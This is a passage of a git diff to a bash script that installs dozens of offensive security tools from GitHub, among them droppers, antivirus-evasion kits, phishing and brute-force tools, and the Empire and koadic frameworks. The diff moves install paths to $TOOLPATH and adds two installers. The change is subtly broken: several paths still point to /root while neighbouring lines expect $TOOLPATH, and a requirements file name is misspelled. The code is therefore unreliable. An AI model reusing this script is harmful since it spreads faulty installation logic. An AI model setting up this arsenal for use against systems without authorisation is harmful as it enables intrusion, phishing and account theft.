 		gitlink="https://github.com/reverse-shell/routersploit.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10154,6 +10264,7 @@ check_if_ks
 	{
 		foldname="Infoga"
 		gitlink="https://github.com/m4ll0k/Infoga.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10164,7 +10275,8 @@ check_if_ks
 	function install_nwatch
 	{
 		foldname="nWatch"
-		gitlink="https://github.com/suraj-root/nWatch.git"
+		gitlink="https://github.com/Cyber-Forensic/nWatch.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10183,6 +10295,7 @@ check_if_ks
 	{
 		foldname="eternal_scanner"
 		gitlink="https://github.com/peterpt/eternal_scanner.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10194,6 +10307,7 @@ check_if_ks
 	{
 		foldname="eaphammer"
 		gitlink="https://github.com/s0lst1c3/eaphammer.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10207,6 +10321,7 @@ check_if_ks
 	{
 		foldname="dagon"
 		gitlink="https://github.com/ekultek/dagon.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10220,6 +10335,7 @@ check_if_ks
 	{
 		foldname="LALIN"
 		gitlink="https://github.com/Screetsec/LALIN.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10231,6 +10347,7 @@ check_if_ks
 	{
 		foldname="KnockMail"
 		gitlink="https://github.com/4w4k3/KnockMail.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10242,6 +10359,7 @@ check_if_ks
 	{
 		foldname="kwetza"
 		gitlink="https://github.com/sensepost/kwetza.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10252,20 +10370,20 @@ check_if_ks
 	}
 	function install_ngrok
 	{
-		if [[ -f /root/ngrok || -f /root/ngrok.zip ]]
+		if [[ -f $TOOLPATH/ngrok || -f $TOOLPATH/ngrok.zip ]]
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
 			$READAK
-			rm -f /root/ngrok
-			rm -f /root/ngrok.zip
+			rm -r $TOOLPATH/ngrok
+			rm -r $TOOLPATH/ngrok.zip
 		fi
-		rm -f /root/ngrok.zip
+		rm -r $TOOLPATH/ngrok.zip
 		cd
 		echo -e "Downloading Ngrok"
 		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --output-document=/root/ngrok.zip
 		echo -e "Unzipping Ngrok"
-		unzip /root/ngrok.zip
+		unzip $TOOLPATH/ngrok.zip
 	}
 	function install_netdiscover
 	{
@@ -10294,42 +10412,44 @@ check_if_ks
 	}
 	function install_vmr
 	{
-		if [[ -d /root/mdk3-v6 || -d /root/VMR ]]
+		if [[ -d $TOOLPATH/mdk3-v6 || -d $TOOLPATH/VMR ]]
 		then
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
 			$READAK
-			rm -r /root/mdk3-v6
-			if [[ -f /root/VMR-MDK-K2-2017R-012x2.zip ]]
+			rm -r $TOOLPATH/mdk3-v6
+			if [[ -f $TOOLPATH/VMR-MDK-K2-2017R-012x2.zip ]]
 			then
 				rm /root/VMR-MDK-K2-2017R-012x2.zip
 			fi
-			if [[ -d /root/VMR ]]
+			if [[ -d $TOOLPATH/VMR ]]
 			then
-				rm -r /root/VMR
+				rm -r $TOOLPATH/VMR
 			fi
 		fi
 		cd
 		wget https://github.com/musket33/VMR-MDK-Kali2-Kali2016/raw/master/VMR-MDK-K2-2017R-012x2.zip
-		unzip /root/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR
-		cp -r /root/VMR/mdk3-v6 /root/
-		cd /root/mdk3-v6
+		unzip $TOOLPATH/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR
+		cp -r $TOOLPATH/VMR/mdk3-v6 /root/
+		cd $TOOLPATH/mdk3-v6
 		make
 		make install
-		chmod 755 /root/mdk3-v6/*
-		chmod +x /root/VMR/*.sh
+		chmod 755 $TOOLPATH/mdk3-v6/*
+		chmod +x $TOOLPATH/VMR/*.sh
 		cd
 	}
 	function install_hashbuster
 	{
 		foldname="Hash-Buster"
 		gitlink="https://github.com/UltimateHackers/Hash-Buster.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_findsploit
 	{
 		foldname="Findsploit"
 		gitlink="https://github.com/1N3/Findsploit.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10347,6 +10467,7 @@ check_if_ks
 	{
 		foldname="operative-framework"
 		gitlink="https://github.com/graniet/operative-framework.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10360,12 +10481,14 @@ check_if_ks
 
 		foldname="netattack2"
 		gitlink="https://github.com/chrizator/netattack2.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_koadic
 	{
 		foldname="koadic"
 		gitlink="https://github.com/zerosum0x0/koadic.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10378,6 +10501,7 @@ check_if_ks
 	{
 		foldname="Empire"
 		gitlink="https://github.com/EmpireProject/Empire.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10392,17 +10516,19 @@ check_if_ks
 	{
 		foldname="Meterpreter_Paranoid_Mode-SSL"
 		gitlink="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_dropit_frmw
 	{
 		foldname="Dr0p1t-Framework"
 		gitlink="https://github.com/D4Vinci/Dr0p1t-Framework.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			cd
+			cd $TOOLPATH
 			git clone $gitlink
 			chmod 777 -R Dr0p1t-Framework
 			cd Dr0p1t-Framework
@@ -10414,17 +10540,19 @@ check_if_ks
 	{
 		foldname="WiFi-Pumpkin"
 		gitlink="https://github.com/P0cL4bs/WiFi-Pumpkin.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
 		then
-			./installer.sh --install
+			bash installer.sh --install
 		fi
 	}
 	function install_veil
 	{
 		foldname="Veil"
 		gitlink="https://github.com/Veil-Framework/Veil.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10437,6 +10565,7 @@ check_if_ks
 	{
 		foldname="leviathan"
 		gitlink="https://github.com/leviathan-framework/leviathan.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10449,6 +10578,7 @@ check_if_ks
 	{
 		foldname="FakeImageExploiter"
 		gitlink="https://github.com/r00t-3xp10it/FakeImageExploiter.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10460,12 +10590,14 @@ check_if_ks
 	{
 		foldname="avet"
 		gitlink="https://github.com/govolution/avet.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_gloom
 	{
 		foldname="Gloom-Framework"
 		gitlink="https://github.com/StreetSec/Gloom-Framework.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10477,6 +10609,7 @@ check_if_ks
 	{
 		foldname="ARCANUS"
 		gitlink="https://github.com/EgeBalci/ARCANUS.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_msfpc
@@ -10487,18 +10620,21 @@ check_if_ks
 	{
 		foldname="morphHTA"
 		gitlink="https://github.com/vysec/morphHTA.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_lfi
 	{
 		foldname="LFISuite"
 		gitlink="https://github.com/D35m0nd142/LFISuite.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_unibyav
 	{
 		foldname="UniByAv"
 		gitlink="https://github.com/Mr-Un1k0d3r/UniByAv.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10510,18 +10646,21 @@ check_if_ks
 	{
 		foldname="demiguise"
 		gitlink="https://github.com/nccgroup/demiguise.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_dkmc
 	{
 		foldname="DKMC"
 		gitlink="https://github.com/Mr-Un1k0d3r/DKMC.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_sechub
 	{
 		foldname="secHub"
 		gitlink="https://github.com/cys3c/secHub.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10539,6 +10678,7 @@ check_if_ks
 		apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
 		foldname="MITMf"
 		gitlink="https://github.com/byt3bl33d3r/MITMf"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10557,6 +10697,7 @@ check_if_ks
 	{
 		foldname="opensource"
 		gitlink="https://github.com/r00t-3xp10it/netool-toolkit"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10571,7 +10712,8 @@ check_if_ks
 	function install_patator
 	{
 		foldname="patator"
-		gitlink="https://github.com/lanjelot/patator.git"		
+		gitlink="https://github.com/lanjelot/patator.git"	
+		cd $TOOLPATH	
 		install_default
 	}
 	function install_zeus
@@ -10590,6 +10732,7 @@ check_if_ks
 	{
 		foldname="Evil-Droid"
 		gitlink="https://github.com/M4sc3r4n0/Evil-Droid.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10601,6 +10744,7 @@ check_if_ks
 	{
 		foldname="NoSQLMap"
 		gitlink="https://github.com/codingo/NoSQLMap.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10612,6 +10756,7 @@ check_if_ks
 	{
 		foldname="EggShell"
 		gitlink="https://github.com/neoneggplant/EggShell.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10624,6 +10769,7 @@ check_if_ks
 	{
 		foldname="Zerodoor"
 		gitlink="https://github.com/Souhardya/Zerodoor.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 	}
@@ -10632,6 +10778,7 @@ check_if_ks
 		pip3 install objection
 		foldname="objection"
 		gitlink="https://github.com/sensepost/objection.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10643,6 +10790,7 @@ check_if_ks
 	{
 		foldname="cromos"
 		gitlink="https://github.com/evilsocketbr/cromos.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10654,6 +10802,7 @@ check_if_ks
 	{
 		foldname="fsociety"
 		gitlink="https://github.com/Manisso/fsociety.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10666,6 +10815,7 @@ check_if_ks
 	{
 		foldname="Yuki-Chan-The-Auto-Pentest"
 		gitlink="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10681,6 +10831,7 @@ check_if_ks
 	{
 		foldname="SocialFish"
 		gitlink="https://github.com/UndeadSec/SocialFish.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10693,12 +10844,14 @@ check_if_ks
 	{
 		foldname="AutoSploit"
 		gitlink="https://github.com/NullArray/AutoSploit.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_blazy
 	{
 		foldname="Blazy"
 		gitlink="https://github.com/UltimateHackers/Blazy.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10710,6 +10863,7 @@ check_if_ks
 	{
 		foldname="Striker"
 		gitlink="https://github.com/UltimateHackers/Striker.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10721,6 +10875,7 @@ check_if_ks
 	{
 		foldname="hyprPulse"
 		gitlink="https://github.com/Ethical-H4CK3R/hyprPulse.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10735,6 +10890,7 @@ check_if_ks
 	{
 		foldname="InstaBurst"
 		gitlink="https://github.com/Ethical-H4CK3R/InstaBurst.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10749,6 +10905,7 @@ check_if_ks
 	{
 		foldname="SiteBroker"
 		gitlink="https://github.com/Anon-Exploiter/SiteBroker"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10761,12 +10918,14 @@ check_if_ks
 	{
 		foldname="Enigma"
 		gitlink="https://github.com/UndeadSec/Enigma.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_datasploit
 	{
 		foldname="datasploit"
 		gitlink="https://github.com/DataSploit/datasploit.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10789,6 +10948,33 @@ check_if_ks
 			pip3 install stem
 			pip3 install instagram-py
 			instagram-py --create-configuration
+		fi
+	}
+	function install_ptt
+	{
+		foldname="Penetration-Testing-Toolkit"
+		gitlink="https://github.com/veerupandey/Penetration-Testing-Toolkit.git"
+		cd $TOOLPATH
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			cd $TOOLPATH/Penetration-Testing-Toolkit
+			chmod +x install.sh
+			bash install.sh
+		fi
+	}
+	function install_set
+	{
+		foldname="set"
+		gitlink="https://github.com/trustedsec/social-engineer-toolkit.git"
+		cd /usr/share
+		git clone $gitlink $foldname
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			cd set
+			pip install -r requeriments.txt
 		fi
 	}
 
